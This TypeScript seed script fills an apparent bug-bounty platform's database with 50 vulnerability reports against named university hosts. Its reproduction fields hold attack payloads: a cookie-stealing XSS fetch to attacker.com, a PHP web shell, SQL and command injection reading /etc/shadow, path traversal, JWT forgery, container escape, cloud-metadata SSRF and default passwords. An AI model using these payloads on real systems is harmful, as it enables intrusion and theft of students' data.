/**
 * 创建 50 条真实漏洞数据，随机分配给测试用户（不均匀分布）
 */
import "dotenv/config";
import { PrismaClient } from "@prisma/client";
import { PrismaPg } from "@prisma/adapter-pg";

const databaseUrl = process.env.DATABASE_URL;
if (!databaseUrl) throw new Error("DATABASE_URL is not set");
const adapter = new PrismaPg({ connectionString: databaseUrl });
const prisma = new PrismaClient({ adapter });

// 50 条真实漏洞数据
const VULNS = [
  {
    title: "重庆邮电大学教务系统存在SQL注入漏洞",
    targetUrl: "https://jwzx.cqupt.edu.cn/login",
    vulnType: "SQL注入",
    severity: "critical" as const,
    status: "fixed" as const,
    description: "教务系统登录接口 `username` 参数未做参数化处理，攻击者可构造 `' OR 1=1--` 绕过认证，或通过联合查询导出全量学生信息。",
    reproductionSteps: "1. 访问登录页\n2. 用户名输入 `' OR '1'='1`，密码任意\n3. 成功登录任意账号",
    impactScope: "影响全校约5万名学生信息泄露，包括学号、姓名、成绩",
    rewardPoints: 500,
    daysAgo: 120,
  },
  {
    title: "校园网VPN系统未授权访问内网资源",
    targetUrl: "https://vpn.cqupt.edu.cn/",
    vulnType: "未授权访问",
    severity: "critical" as const,
    status: "approved" as const,
    description: "VPN系统在用户未完成二次认证情况下，通过修改Cookie中的`auth_step`字段为`2`可直接访问内网资源，绕过双因素认证。",
    reproductionSteps: "1. 完成第一步账号密码认证\n2. 拦截请求修改Cookie `auth_step=2`\n3. 直接访问内网服务",
    impactScope: "可访问学校内网所有服务，包括财务系统、人事系统",
    rewardPoints: 450,
    daysAgo: 90,
  },
  {
    title: "学生就业平台存在存储型XSS",
    targetUrl: "https://career.cqupt.edu.cn/resume",
    vulnType: "XSS",
    severity: "high" as const,
    status: "fixed" as const,
    description: "简历编辑页「自我介绍」字段未过滤HTML标签，提交后在HR查看简历时触发XSS，可窃取HR的session cookie。",
    reproductionSteps: "1. 登录学生账号进入简历编辑\n2. 自我介绍填写 `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`\n3. 等待HR查看简历时触发",
    impactScope: "可劫持HR账号，批量获取企业联系方式及学生投递记录",
    rewardPoints: 300,
    daysAgo: 85,
  },
  {
    title: "图书馆系统IDOR导致任意用户借阅记录泄露",
    targetUrl: "https://lib.cqupt.edu.cn/api/borrow/list",
    vulnType: "IDOR",
    severity: "high" as const,
    status: "approved" as const,
    description: "借阅记录API `/api/borrow/list?userId=xxx` 未校验当前登录用户与请求userId的对应关系，遍历userId即可获取所有人的借阅历史。",
    reproductionSteps: "1. 登录图书馆系统\n2. 访问 `/api/borrow/list?userId=1`\n3. 依次修改userId遍历所有用户",
    impactScope: "泄露全校师生借阅隐私，可推断阅读偏好、宗教信仰等敏感信息",
    rewardPoints: 250,
    daysAgo: 70,
  },
  {
    title: "选课系统并发漏洞导致超额选课",
    targetUrl: "https://jwzx.cqupt.edu.cn/course/select",
    vulnType: "逻辑漏洞",
    severity: "high" as const,
    status: "fixed" as const,
    description: "选课接口未使用事务锁，在高并发情况下通过竞态条件可选入已满课程，或同一课程被重复选择。",
    reproductionSteps: "1. 使用Burp Suite拦截选课请求\n2. 使用Intruder同时发送50个相同请求\n3. 观察到超出课程容量的选课成功",
    impactScope: "可导致课程容量异常，影响正常教学秩序",
    rewardPoints: 200,
    daysAgo: 65,
  },
  {
    title: "科研管理系统任意文件上传",
    targetUrl: "https://research.cqupt.edu.cn/upload",
    vulnType: "文件上传",
    severity: "critical" as const,
    status: "fixing" as const,
    description: "科研成果上传接口仅在前端验证文件类型，绕过前端限制可上传PHP WebShell，获取服务器控制权。",
    reproductionSteps: "1. 上传正常PDF文件抓包\n2. 修改Content-Type和文件名后缀为.php\n3. 上传包含`<?php system($_GET['cmd']);?>`的文件\n4. 访问上传路径执行命令",
    impactScope: "服务器完全沦陷，可横向渗透至内网",
    rewardPoints: 500,
    daysAgo: 30,
  },
  {
    title: "校园一卡通系统弱口令",
    targetUrl: "https://card.cqupt.edu.cn/admin",
    vulnType: "弱口令",
    severity: "critical" as const,
    status: "approved" as const,
    description: "一卡通管理后台使用默认账号 `admin/admin123`，登录后可查看所有学生消费记录、修改余额。",
    reproductionSteps: "1. 访问 /admin 管理后台\n2. 输入 admin/admin123\n3. 成功登录获得管理员权限",
    impactScope: "可操纵全校学生一卡通余额，涉及财产损失",
    rewardPoints: 400,
    daysAgo: 55,
  },
  {
    title: "邮件系统SSRF漏洞",
    targetUrl: "https://mail.cqupt.edu.cn/api/preview",
    vulnType: "SSRF",
    severity: "high" as const,
    status: "reviewing" as const,
    description: "邮件预览功能通过服务端请求外部URL，未限制内网地址，攻击者可读取内网服务数据（如Redis、Elasticsearch）。",
    reproductionSteps: "1. 发送邮件附带链接 `http://127.0.0.1:6379/`\n2. 触发预览功能\n3. 服务端返回Redis响应数据",
    impactScope: "可探测内网拓扑，读取Redis中的session数据",
    rewardPoints: 280,
    daysAgo: 20,
  },
  {
    title: "研究生管理系统JWT算法降级攻击",
    targetUrl: "https://grs.cqupt.edu.cn/api/auth",
    vulnType: "JWT安全",
    severity: "high" as const,
    status: "approved" as const,
    description: "JWT验证接口接受`alg:none`算法，攻击者可伪造任意用户的token，无需知道签名密钥。",
    reproductionSteps: "1. 解码正常JWT\n2. 修改header中alg为none，payload中role为admin\n3. 删除signature部分\n4. 使用伪造token访问管理接口",
    impactScope: "可以任意管理员身份操作研究生学籍信息",
    rewardPoints: 320,
    daysAgo: 45,
  },
  {
    title: "学工系统密码重置逻辑绕过",
    targetUrl: "https://xg.cqupt.edu.cn/resetpwd",
    vulnType: "逻辑漏洞",
    severity: "high" as const,
    status: "fixed" as const,
    description: "密码重置流程中，验证码校验在服务端返回`{valid:true/false}`后由前端控制跳转，修改响应包可跳过验证码校验直接重置任意账号密码。",
    reproductionSteps: "1. 发起任意账号密码重置\n2. 输入错误验证码提交\n3. 拦截响应包将`valid:false`改为`valid:true`\n4. 成功进入重置密码页面",
    impactScope: "可重置任意学生账号密码，获取账号控制权",
    rewardPoints: 260,
    daysAgo: 80,
  },
  {
    title: "在线考试系统答案泄露",
    targetUrl: "https://exam.cqupt.edu.cn/api/exam/start",
    vulnType: "信息泄露",
    severity: "high" as const,
    status: "fixed" as const,
    description: "开始考试API一次性返回所有题目及答案，前端JavaScript负责隐藏答案，通过查看API响应可获取全部正确答案。",
    reproductionSteps: "1. 开始考试抓取 /api/exam/start 响应\n2. 在JSON中找到answer字段\n3. 获取所有题目答案",
    impactScope: "影响考试公平性，所有在线考试成绩失去参考价值",
    rewardPoints: 350,
    daysAgo: 100,
  },
  {
    title: "校园网认证系统HTTP劫持",
    targetUrl: "http://p.cqupt.edu.cn/",
    vulnType: "中间人攻击",
    severity: "medium" as const,
    status: "approved" as const,
    description: "校园网认证页面使用HTTP明文传输，认证凭据（学号+密码）在网络中明文传输，同一VLAN内可被嗅探捕获。",
    reproductionSteps: "1. 连接校园网\n2. 使用Wireshark监听同网段流量\n3. 过滤HTTP POST请求获取认证凭据",
    impactScope: "同一楼层学生的统一认证账号可能被窃取",
    rewardPoints: 180,
    daysAgo: 110,
  },
  {
    title: "OA系统CSRF漏洞",
    targetUrl: "https://oa.cqupt.edu.cn/leave/apply",
    vulnType: "CSRF",
    severity: "medium" as const,
    status: "fixed" as const,
    description: "请假申请接口未验证CSRF Token，攻击者可构造恶意页面诱导已登录用户点击，以其身份提交任意请假申请。",
    reproductionSteps: "1. 构造包含隐藏表单的HTML页面\n2. 表单action指向请假接口\n3. 诱导目标用户访问页面自动提交",
    impactScope: "可伪造师生请假、出差等OA流程",
    rewardPoints: 150,
    daysAgo: 75,
  },
  {
    title: "实验室预约系统越权操作",
    targetUrl: "https://lab.cqupt.edu.cn/api/reservation",
    vulnType: "越权",
    severity: "medium" as const,
    status: "approved" as const,
    description: "取消预约接口 `/api/reservation/{id}/cancel` 未校验操作者是否为预约创建者，任意用户可取消他人的实验室预约。",
    reproductionSteps: "1. 登录普通用户账号\n2. 访问 /api/reservation/他人预约ID/cancel\n3. 成功取消他人预约",
    impactScope: "可恶意取消他人实验室预约，影响正常实验教学",
    rewardPoints: 120,
    daysAgo: 60,
  },
  {
    title: "新闻发布系统后台弱口令",
    targetUrl: "https://news.cqupt.edu.cn/admin",
    vulnType: "弱口令",
    severity: "medium" as const,
    status: "fixed" as const,
    description: "学校新闻系统WordPress后台存在弱口令 `admin/cqupt2020`，可登录后台发布虚假新闻或植入恶意代码。",
    reproductionSteps: "1. 访问 /wp-admin\n2. 使用 admin/cqupt2020 登录\n3. 获得内容管理权限",
    impactScope: "可发布虚假校园新闻，损害学校声誉",
    rewardPoints: 160,
    daysAgo: 95,
  },
  {
    title: "宿舍管理系统目录遍历",
    targetUrl: "https://dorm.cqupt.edu.cn/download",
    vulnType: "路径遍历",
    severity: "medium" as const,
    status: "fixing" as const,
    description: "文件下载接口 `?file=../../etc/passwd` 未对路径进行规范化，可读取服务器任意文件。",
    reproductionSteps: "1. 访问 /download?file=../../etc/passwd\n2. 成功读取系统文件内容",
    impactScope: "可读取服务器配置文件、数据库连接字符串等敏感信息",
    rewardPoints: 200,
    daysAgo: 40,
  },
  {
    title: "招生系统验证码可重复使用",
    targetUrl: "https://zs.cqupt.edu.cn/api/verify",
    vulnType: "逻辑漏洞",
    severity: "medium" as const,
    status: "approved" as const,
    description: "短信验证码验证后服务端未立即销毁，同一验证码在有效期内可被重复使用，导致验证码被截获后可多次利用。",
    reproductionSteps: "1. 获取验证码\n2. 使用验证码登录\n3. 重放相同验证码请求，仍然成功",
    impactScope: "绕过验证码保护，可用于暴力破解或批量操作",
    rewardPoints: 130,
    daysAgo: 50,
  },
  {
    title: "学生评教系统反射型XSS",
    targetUrl: "https://jwzx.cqupt.edu.cn/evaluate/search",
    vulnType: "XSS",
    severity: "medium" as const,
    status: "fixed" as const,
    description: "课程搜索页面将 `keyword` 参数直接拼接在页面中，未进行HTML编码，`keyword=<script>alert(1)</script>` 直接执行。",
    reproductionSteps: "1. 访问 /evaluate/search?keyword=<script>alert(document.cookie)</script>\n2. 页面直接执行脚本",
    impactScope: "可通过钓鱼链接窃取学生cookie，劫持评教账号",
    rewardPoints: 140,
    daysAgo: 88,
  },
  {
    title: "校园论坛任意账号注销",
    targetUrl: "https://bbs.cqupt.edu.cn/api/user/delete",
    vulnType: "越权",
    severity: "medium" as const,
    status: "approved" as const,
    description: "账号注销接口仅需传入目标用户ID，无需当前用户密码确认，且不验证操作者身份，任意用户可注销他人账号。",
    reproductionSteps: "1. 登录论坛\n2. POST /api/user/delete {userId: 目标用户ID}\n3. 目标账号被成功注销",
    impactScope: "可批量注销用户账号，破坏社区数据",
    rewardPoints: 170,
    daysAgo: 72,
  },
  {
    title: "财务系统缴费记录越权查询",
    targetUrl: "https://cwc.cqupt.edu.cn/api/payment/history",
    vulnType: "IDOR",
    severity: "high" as const,
    status: "reviewing" as const,
    description: "缴费历史查询接口通过 `studentId` 参数控制查询对象，未验证当前登录用户与查询ID的对应关系。",
    reproductionSteps: "1. 登录财务系统\n2. 修改请求中studentId为其他学号\n3. 获取他人缴费和奖学金记录",
    impactScope: "泄露学生经济状况隐私，可能引发校园安全问题",
    rewardPoints: 240,
    daysAgo: 15,
  },
  {
    title: "智慧教室系统命令注入",
    targetUrl: "https://classroom.cqupt.edu.cn/admin/ping",
    vulnType: "命令注入",
    severity: "critical" as const,
    status: "pending" as const,
    description: "智慧教室管理后台网络检测功能将用户输入直接拼接到 `ping` 命令中，`; cat /etc/shadow` 可执行任意系统命令。",
    reproductionSteps: "1. 登录管理后台\n2. 网络检测输入框填写 `127.0.0.1; id`\n3. 页面返回 `uid=0(root)` 等命令执行结果",
    impactScope: "服务器root权限沦陷，威胁全楼智慧教室设备",
    rewardPoints: 500,
    daysAgo: 5,
  },
  {
    title: "学术不端检测系统文件读取",
    targetUrl: "https://plagiarism.cqupt.edu.cn/api/report",
    vulnType: "任意文件读取",
    severity: "high" as const,
    status: "approved" as const,
    description: "论文检测报告下载接口通过文件路径参数控制下载内容，路径未做白名单限制，可读取服务器任意文件。",
    reproductionSteps: "1. 提交论文获得reportId\n2. 访问 /api/report?path=../../../../etc/passwd\n3. 下载到系统文件内容",
    impactScope: "可读取系统敏感文件、数据库配置等",
    rewardPoints: 270,
    daysAgo: 58,
  },
  {
    title: "心理健康中心预约系统信息泄露",
    targetUrl: "https://cmhc.cqupt.edu.cn/api/appointment",
    vulnType: "信息泄露",
    severity: "high" as const,
    status: "fixed" as const,
    description: "心理咨询预约记录API未做权限控制，任何登录用户均可访问所有学生的咨询预约信息，包含心理状态描述。",
    reproductionSteps: "1. 登录系统\n2. 访问 /api/appointment/list（不带任何过滤参数）\n3. 获取全部学生心理咨询记录",
    impactScope: "严重侵犯学生心理健康隐私，属敏感个人信息泄露",
    rewardPoints: 400,
    daysAgo: 92,
  },
  {
    title: "档案管理系统XXE注入",
    targetUrl: "https://archive.cqupt.edu.cn/api/import",
    vulnType: "XXE",
    severity: "high" as const,
    status: "fixing" as const,
    description: "档案导入接口接受XML格式数据，XML解析器未禁用外部实体，攻击者可通过XXE读取服务器本地文件或发起SSRF。",
    reproductionSteps: "1. 构造包含外部实体的XML\n2. POST到 /api/import\n3. 响应中包含 /etc/passwd 内容",
    impactScope: "可读取服务器敏感文件，或利用SSRF探测内网",
    rewardPoints: 300,
    daysAgo: 25,
  },
  {
    title: "体育场馆预约系统短信轰炸",
    targetUrl: "https://sport.cqupt.edu.cn/api/sms/send",
    vulnType: "逻辑漏洞",
    severity: "low" as const,
    status: "approved" as const,
    description: "短信验证码发送接口无频率限制，攻击者可对任意手机号无限次触发发送短信，导致短信轰炸和费用损耗。",
    reproductionSteps: "1. 抓取发送短信请求\n2. 循环重放，不限次数发送成功",
    impactScope: "可对任意手机号进行短信轰炸，造成骚扰和资费损失",
    rewardPoints: 80,
    daysAgo: 130,
  },
  {
    title: "校史馆虚拟参观系统敏感信息暴露",
    targetUrl: "https://museum.cqupt.edu.cn/api/config",
    vulnType: "信息泄露",
    severity: "medium" as const,
    status: "fixed" as const,
    description: "虚拟参观系统前端配置文件中明文包含阿里云OSS的AccessKeyId和AccessKeySecret，可用于访问云存储资源。",
    reproductionSteps: "1. 访问前端JS文件\n2. 搜索 AccessKey\n3. 获取云存储凭证",
    impactScope: "可访问、删除或篡改学校云存储中的全部文件资源",
    rewardPoints: 220,
    daysAgo: 115,
  },
  {
    title: "国际交流系统申请表单批量枚举",
    targetUrl: "https://iso.cqupt.edu.cn/api/application/status",
    vulnType: "信息泄露",
    severity: "low" as const,
    status: "approved" as const,
    description: "出国申请状态查询接口通过自增ID查询，无需认证，可遍历所有申请记录获取学生护照号、目标院校等敏感信息。",
    reproductionSteps: "1. 直接访问 /api/application/status?id=1\n2. 依次递增id参数\n3. 获取所有申请者信息",
    impactScope: "泄露出国申请学生护照、联系方式等敏感个人信息",
    rewardPoints: 100,
    daysAgo: 105,
  },
  {
    title: "教职工绩效系统水平越权",
    targetUrl: "https://hr.cqupt.edu.cn/api/performance",
    vulnType: "越权",
    severity: "high" as const,
    status: "fixed" as const,
    description: "绩效查询接口 `?staffId=xxx` 未做登录用户与查询对象的权限绑定，教职工可查看任意同事的薪资绩效数据。",
    reproductionSteps: "1. 登录教职工账号\n2. 修改staffId为同事工号\n3. 获取同事薪资绩效明细",
    impactScope: "泄露全体教职工薪资信息，影响团队关系稳定",
    rewardPoints: 260,
    daysAgo: 68,
  },
  {
    title: "校医院挂号系统个人信息泄露",
    targetUrl: "https://hospital.cqupt.edu.cn/api/record",
    vulnType: "IDOR",
    severity: "critical" as const,
    status: "reviewing" as const,
    description: "就诊记录查询接口通过 `recordId`（自增整数）查询，无权限校验，遍历可获取所有人就诊记录包括诊断结论。",
    reproductionSteps: "1. 查询自己的就诊记录获得recordId\n2. 递增recordId查询他人记录\n3. 获取诊断信息、用药记录",
    impactScope: "泄露师生就医隐私，属于医疗敏感数据",
    rewardPoints: 450,
    daysAgo: 12,
  },
  {
    title: "实训平台Docker逃逸",
    targetUrl: "https://lab.cqupt.edu.cn/sandbox",
    vulnType: "容器逃逸",
    severity: "critical" as const,
    status: "pending" as const,
    description: "在线实训平台为学生提供Docker容器环境，容器以 `--privileged` 特权模式启动，学生可通过挂载宿主机文件系统实现容器逃逸。",
    reproductionSteps: "1. 在实训容器内执行 `fdisk -l` 查看宿主机磁盘\n2. `mkdir /host && mount /dev/vda1 /host`\n3. 访问宿主机全部文件系统",
    impactScope: "可完全控制宿主机，影响该物理机上的所有学生容器",
    rewardPoints: 500,
    daysAgo: 8,
  },
  {
    title: "社团管理系统任意附件下载",
    targetUrl: "https://club.cqupt.edu.cn/download",
    vulnType: "越权",
    severity: "low" as const,
    status: "fixed" as const,
    description: "社团活动附件下载接口不鉴权，知道附件ID即可下载任意社团的内部文件（财务报表、成员名单等）。",
    reproductionSteps: "1. 访问 /download?id=任意附件ID\n2. 不需要登录即可成功下载",
    impactScope: "泄露各社团内部财务数据和成员隐私信息",
    rewardPoints: 90,
    daysAgo: 140,
  },
  {
    title: "学校官网编辑器任意JS注入",
    targetUrl: "https://www.cqupt.edu.cn/editor",
    vulnType: "XSS",
    severity: "medium" as const,
    status: "approved" as const,
    description: "官网富文本编辑器过滤不严，可通过 `<iframe srcdoc>` 绕过XSS过滤注入脚本，影响访问相关页面的所有用户。",
    reproductionSteps: "1. 在编辑器中插入 `<iframe srcdoc='<script>alert(origin)</script>'>`\n2. 保存并访问发布页面\n3. 脚本成功执行",
    impactScope: "可对访问官网的所有用户执行钓鱼攻击",
    rewardPoints: 190,
    daysAgo: 78,
  },
  {
    title: "毕业论文提交系统敏感路径泄露",
    targetUrl: "https://thesis.cqupt.edu.cn/",
    vulnType: "信息泄露",
    severity: "low" as const,
    status: "fixed" as const,
    description: "系统错误页面在生产环境下未关闭debug模式，异常时返回完整堆栈信息包含服务器路径、数据库连接字符串等。",
    reproductionSteps: "1. 访问不存在的接口路径\n2. 触发500错误\n3. 错误响应包含完整stacktrace和配置信息",
    impactScope: "泄露服务器内部信息，为进一步攻击提供情报",
    rewardPoints: 70,
    daysAgo: 135,
  },
  {
    title: "奖学金评定系统投票刷票",
    targetUrl: "https://scholarship.cqupt.edu.cn/api/vote",
    vulnType: "逻辑漏洞",
    severity: "medium" as const,
    status: "fixed" as const,
    description: "投票接口仅通过Cookie中的studentId判断是否已投票，删除Cookie后可无限重复投票，影响评选公正性。",
    reproductionSteps: "1. 正常投票后删除 voted_studentId Cookie\n2. 重新访问投票页面\n3. 再次投票成功，无限重复",
    impactScope: "可刷票影响奖学金评定结果，损害公平竞争",
    rewardPoints: 150,
    daysAgo: 83,
  },
  {
    title: "学校邮件系统开放转发",
    targetUrl: "smtp://mail.cqupt.edu.cn:25",
    vulnType: "邮件安全",
    severity: "medium" as const,
    status: "fixed" as const,
    description: "学校SMTP服务器允许未认证的开放转发，攻击者可利用学校邮件服务器以学校域名发送伪造邮件进行钓鱼攻击。",
    reproductionSteps: "1. 直接连接 smtp.cqupt.edu.cn:25\n2. 使用EHLO命令\n3. 不认证直接发送伪造的 @cqupt.edu.cn 邮件",
    impactScope: "学校域名可被用于钓鱼攻击，损害学校信誉",
    rewardPoints: 180,
    daysAgo: 98,
  },
  {
    title: "移动端App接口明文传输密码",
    targetUrl: "https://app.cqupt.edu.cn/api/login",
    vulnType: "传输安全",
    severity: "medium" as const,
    status: "approved" as const,
    description: "校园App登录接口将用户密码以MD5单次哈希后传输，MD5彩虹表可直接还原原始密码，且未使用盐值。",
    reproductionSteps: "1. 抓包校园App登录请求\n2. 找到password字段为32位MD5\n3. 使用彩虹表查询还原弱密码",
    impactScope: "弱密码用户的明文密码可被批量还原",
    rewardPoints: 160,
    daysAgo: 62,
  },
  {
    title: "校园失物招领系统个人联系方式泄露",
    targetUrl: "https://lost.cqupt.edu.cn/api/items",
    vulnType: "信息泄露",
    severity: "low" as const,
    status: "fixed" as const,
    description: "失物招领列表接口返回了发布者的完整手机号，未做脱敏处理，任何人无需登录可直接获取所有发布者手机号。",
    reproductionSteps: "1. 访问 /api/items 不带认证\n2. 响应JSON中包含 `phone: '13812345678'` 明文字段",
    impactScope: "批量泄露学生手机号，可能引发骚扰电话",
    rewardPoints: 80,
    daysAgo: 125,
  },
  {
    title: "后勤维修报修系统SQL注入",
    targetUrl: "https://repair.cqupt.edu.cn/api/query",
    vulnType: "SQL注入",
    severity: "high" as const,
    status: "fixed" as const,
    description: "报修记录查询接口 `location` 参数直接拼接SQL，可通过布尔盲注或时间盲注提取数据库内容。",
    reproductionSteps: "1. 访问 /api/query?location=图书馆' AND SLEEP(5)--\n2. 响应延迟5秒确认注入点存在\n3. 使用sqlmap进一步利用",
    impactScope: "可拖取全部报修记录及宿舍位置信息",
    rewardPoints: 280,
    daysAgo: 77,
  },
  {
    title: "学生创新创业系统API未鉴权",
    targetUrl: "https://startup.cqupt.edu.cn/api/projects",
    vulnType: "未授权访问",
    severity: "medium" as const,
    status: "approved" as const,
    description: "项目列表及详情接口未做登录鉴权，公网可直接访问所有学生创新创业项目详细方案、商业计划书内容。",
    reproductionSteps: "1. 无需登录直接访问 /api/projects\n2. 获取所有项目及完整方案内容",
    impactScope: "学生创业项目商业计划泄露，存在知识产权风险",
    rewardPoints: 140,
    daysAgo: 48,
  },
  {
    title: "学校云盘共享链接爆破",
    targetUrl: "https://pan.cqupt.edu.cn/share",
    vulnType: "逻辑漏洞",
    severity: "low" as const,
    status: "fixed" as const,
    description: "私密共享链接使用4位纯数字提取码，接口无暴力破解防护，平均10000次请求内可枚举获取任意私密文件。",
    reproductionSteps: "1. 获得某文件共享链接\n2. 编写脚本枚举0000-9999\n3. 平均5000次内找到正确提取码",
    impactScope: "任意私密共享文件均可被暴力破解获取",
    rewardPoints: 90,
    daysAgo: 118,
  },
  {
    title: "学生工作系统批量导出敏感数据",
    targetUrl: "https://xg.cqupt.edu.cn/api/export",
    vulnType: "越权",
    severity: "high" as const,
    status: "reviewing" as const,
    description: "导出接口仅需携带普通学生token即可触发全量学生数据导出（姓名、学号、政治面貌、家庭住址等），无需管理员权限。",
    reproductionSteps: "1. 使用普通学生账号登录\n2. POST /api/export {type: 'all'}\n3. 获取包含全量学生敏感信息的Excel文件",
    impactScope: "全体学生个人信息大规模泄露，违反《个人信息保护法》",
    rewardPoints: 400,
    daysAgo: 18,
  },
  {
    title: "研究生选题系统时间竞争漏洞",
    targetUrl: "https://grs.cqupt.edu.cn/api/topic/select",
    vulnType: "逻辑漏洞",
    severity: "medium" as const,
    status: "fixed" as const,
    description: "导师课题选择接口存在TOCTOU竞争条件，并发请求下同一课题可被多名学生同时选中，超过课题名额限制。",
    reproductionSteps: "1. 在选题开放瞬间使用多线程同时发送选题请求\n2. 观察到同一课题被超过名额的学生选中",
    impactScope: "影响研究生选题公平性，造成导师指导负担超额",
    rewardPoints: 160,
    daysAgo: 87,
  },
  {
    title: "智慧校园App深度链接劫持",
    targetUrl: "cquptapp://auth/callback",
    vulnType: "移动安全",
    severity: "medium" as const,
    status: "approved" as const,
    description: "校园App OAuth回调使用自定义URL scheme，第三方恶意App可注册相同scheme截获OAuth token，实现账号劫持。",
    reproductionSteps: "1. 安装注册了相同scheme的恶意App\n2. 触发校园App OAuth登录\n3. 恶意App接收到包含token的回调",
    impactScope: "可劫持统一认证token，全面接管用户校园账号",
    rewardPoints: 200,
    daysAgo: 52,
  },
  {
    title: "教学视频平台Insecure Direct Object Reference",
    targetUrl: "https://video.cqupt.edu.cn/api/video",
    vulnType: "IDOR",
    severity: "medium" as const,
    status: "fixed" as const,
    description: "付费教学视频下载链接通过自增videoId生成，未与用户购买记录绑定，遍历ID可下载所有付费视频。",
    reproductionSteps: "1. 购买一个视频获得下载链接\n2. 修改链接中的videoId\n3. 成功下载未购买的付费视频",
    impactScope: "付费视频资源被免费获取，损害学校知识产权收益",
    rewardPoints: 130,
    daysAgo: 73,
  },
  {
    title: "校园跑步打卡系统GPS坐标伪造",
    targetUrl: "https://run.cqupt.edu.cn/api/checkin",
    vulnType: "逻辑漏洞",
    severity: "low" as const,
    status: "approved" as const,
    description: "跑步打卡接口仅校验提交的GPS坐标是否在校园范围内，未对坐标变化速度、运动轨迹合理性做验证，可静止状态模拟跑步。",
    reproductionSteps: "1. 抓取打卡接口\n2. 构造在校园范围内的GPS坐标序列\n3. 批量提交，完成跑步任务",
    impactScope: "影响体育成绩公平性，使强制跑步要求形同虚设",
    rewardPoints: 70,
    daysAgo: 145,
  },
  {
    title: "学校邮件列表SSRF",
    targetUrl: "https://mail.cqupt.edu.cn/api/webhook",
    vulnType: "SSRF",
    severity: "high" as const,
    status: "pending" as const,
    description: "邮件系统Webhook配置接口允许设置任意回调URL，服务端在邮件触发时主动请求该URL，可用于探测内网服务。",
    reproductionSteps: "1. 配置Webhook URL为 http://169.254.169.254/metadata（云元数据）\n2. 触发邮件事件\n3. 服务器访问云元数据接口返回实例凭证",
    impactScope: "可获取云服务器临时凭证，接管云账号下全部资源",
    rewardPoints: 380,
    daysAgo: 7,
  },
  {
    title: "图书馆座位预约系统账号枚举",
    targetUrl: "https://lib.cqupt.edu.cn/api/user/exists",
    vulnType: "信息泄露",
    severity: "low" as const,
    status: "fixed" as const,
    description: "账号注册时，系统对已存在/不存在的用户名返回不同的错误信息（'用户名已被使用' vs '验证码错误'），可据此枚举有效账号。",
    reproductionSteps: "1. 尝试注册已知学号\n2. 系统返回'用户名已被使用'\n3. 据此枚举判断哪些学号已注册",
    impactScope: "可枚举有效账号列表，为暴力破解提供目标",
    rewardPoints: 60,
    daysAgo: 150,
  },
];

// 不均匀权重分配（模拟真实情况：部分用户活跃，部分不活跃）
// 权重越高，被分配到的漏洞越多
function weightedRandomIndex(weights: number[]): number {
  const total = weights.reduce((a, b) => a + b, 0);
  let r = Math.random() * total;
  for (let i = 0; i < weights.length; i++) {
    r -= weights[i];
    if (r <= 0) return i;
  }
  return weights.length - 1;
}

async function main() {
  // 查询已创建的测试用户（testuser系列，按邮箱匹配）
  const testUsers = await prisma.user.findMany({
    where: { email: { contains: "testuser" } },
    select: { id: true, username: true },
    orderBy: { createdAt: "asc" },
  });

  if (testUsers.length === 0) {
    console.error("未找到测试用户，请先运行 seed-test-users.ts");
    process.exit(1);
  }

  console.log(`找到 ${testUsers.length} 个测试用户\n`);

  // 生成不均匀权重（指数分布模拟）
  const weights = testUsers.map((_, i) => {
    if (i < 3) return 15;       // 前3名活跃用户，权重很高
    if (i < 8) return 8;        // 中等活跃
    if (i < 15) return 3;       // 普通用户
    return 1;                   // 不活跃用户
  });

  // 获取现有漏洞数量确定起始编号
  const existingCount = await prisma.vulnerability.count();
  const startCode = existingCount + 1;

  console.log("漏洞编号\t\t提交人\t\t\t严重程度\t状态");
  console.log("─".repeat(80));

  for (let i = 0; i < VULNS.length; i++) {
    const vuln = VULNS[i];
    const userIdx = weightedRandomIndex(weights);
    const submitter = testUsers[userIdx];
    const vulnCode = `CQUPT-${String(startCode + i).padStart(4, "0")}`;
    const submittedAt = new Date(Date.now() - vuln.daysAgo * 24 * 60 * 60 * 1000);
    const approvedAt = ["approved", "fixed", "fixing"].includes(vuln.status)
      ? new Date(submittedAt.getTime() + 2 * 24 * 60 * 60 * 1000)
      : null;
    const fixedAt = vuln.status === "fixed"
      ? new Date(submittedAt.getTime() + 7 * 24 * 60 * 60 * 1000)
      : null;

    await prisma.vulnerability.create({
      data: {
        vulnCode,
        title: vuln.title,
        targetUrl: vuln.targetUrl,
        vulnType: vuln.vulnType,
        severity: vuln.severity,
        status: vuln.status,
        description: vuln.description,
        reproductionSteps: vuln.reproductionSteps ?? null,
        impactScope: vuln.impactScope ?? null,
        submitterId: submitter.id,
        rewardPoints: vuln.rewardPoints,
        submittedAt,
        approvedAt,
        fixedAt,
      },
    });

    console.log(`${vulnCode}\t${submitter.username.padEnd(16)}\t${vuln.severity.padEnd(10)}\t${vuln.status}`);
  }

  // 统计每个用户的漏洞数
  console.log("\n─".repeat(80));
  console.log("\n各用户提交统计：");
  const stats = await prisma.vulnerability.groupBy({
    by: ["submitterId"],
    _count: { id: true },
    orderBy: { _count: { id: "desc" } },
  });

  for (const s of stats) {
    const user = testUsers.find(u => u.id === s.submitterId);
    if (user) console.log(`  ${user.username}: ${s._count.id} 条`);
  }

  console.log(`\n✓ 共创建 ${VULNS.length} 条漏洞数据`);
}

main()
  .catch((e) => { console.error(e); process.exit(1); })
  .finally(() => prisma.$disconnect());
